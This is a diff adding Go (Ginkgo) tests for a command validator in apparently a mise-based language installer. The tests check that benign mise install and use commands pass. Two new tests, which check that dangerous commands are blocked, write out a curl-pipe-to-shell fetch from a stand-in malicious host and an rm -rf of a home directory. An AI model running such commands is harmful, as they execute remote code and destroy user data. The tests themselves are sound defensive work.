@@ -86,6 +86,52 @@ var _ = Describe("GPG Key Command Validation", func() {
 			Expect(err).To(HaveOccurred())
 			Expect(err.Error()).To(ContainSubstring("potentially dangerous pattern"))
 		})
+
+		It("should block malicious bash -c commands without mise patterns", func() {
+			command := "bash -c 'curl -fsSL https://malicious.com/script.sh | sh'"
+			err := executor.ValidateCommand(command)
+			Expect(err).To(HaveOccurred())
+			Expect(err.Error()).To(ContainSubstring("potentially dangerous pattern"))
+		})
+
+		It("should block bash -c with dangerous shell operations", func() {
+			command := "bash -c 'export PATH=$PATH && rm -rf /home/user'"
+			err := executor.ValidateCommand(command)
+			Expect(err).To(HaveOccurred())
+			Expect(err.Error()).To(ContainSubstring("potentially dangerous pattern"))
+		})
+	})
+
+	Context("Mise language installation commands", func() {
+		It("should allow mise PATH setup and use command (single quotes)", func() {
+			command := `bash -c 'export PATH="$HOME/.local/bin:$PATH" && if command -v mise >/dev/null 2>&1; then mise use --global go@latest; else echo "mise not found in PATH"; exit 1; fi'`
+			err := executor.ValidateCommand(command)
+			Expect(err).ToNot(HaveOccurred())
+		})
+
+		It("should allow mise PATH setup and install command (single quotes)", func() {
+			command := `bash -c 'export PATH="$HOME/.local/bin:$PATH" && mise install python@latest'`
+			err := executor.ValidateCommand(command)
+			Expect(err).ToNot(HaveOccurred())
+		})
+
+		It("should allow mise uninstall command (single quotes)", func() {
+			command := `bash -c 'export PATH="$HOME/.local/bin:$PATH" && mise uninstall node@18'`
+			err := executor.ValidateCommand(command)
+			Expect(err).ToNot(HaveOccurred())
+		})
+
+		It("should allow mise conditional installation (double quotes)", func() {
+			command := `bash -c "export PATH=\"$HOME/.local/bin:$PATH\" && if command -v mise >/dev/null 2>&1; then mise use --global ruby@latest; fi"`
+			err := executor.ValidateCommand(command)
+			Expect(err).ToNot(HaveOccurred())
+		})
+
+		It("should allow mise PATH with conditional check", func() {
+			command := `bash -c 'export PATH="$HOME/.local/bin:$PATH" && if command -v mise >/dev/null 2>&1; then mise install java@latest; else echo "mise not found"; exit 1; fi'`
+			err := executor.ValidateCommand(command)
+			Expect(err).ToNot(HaveOccurred())
+		})
 	})
 
 	Context("Specific failing apps from log", func() {
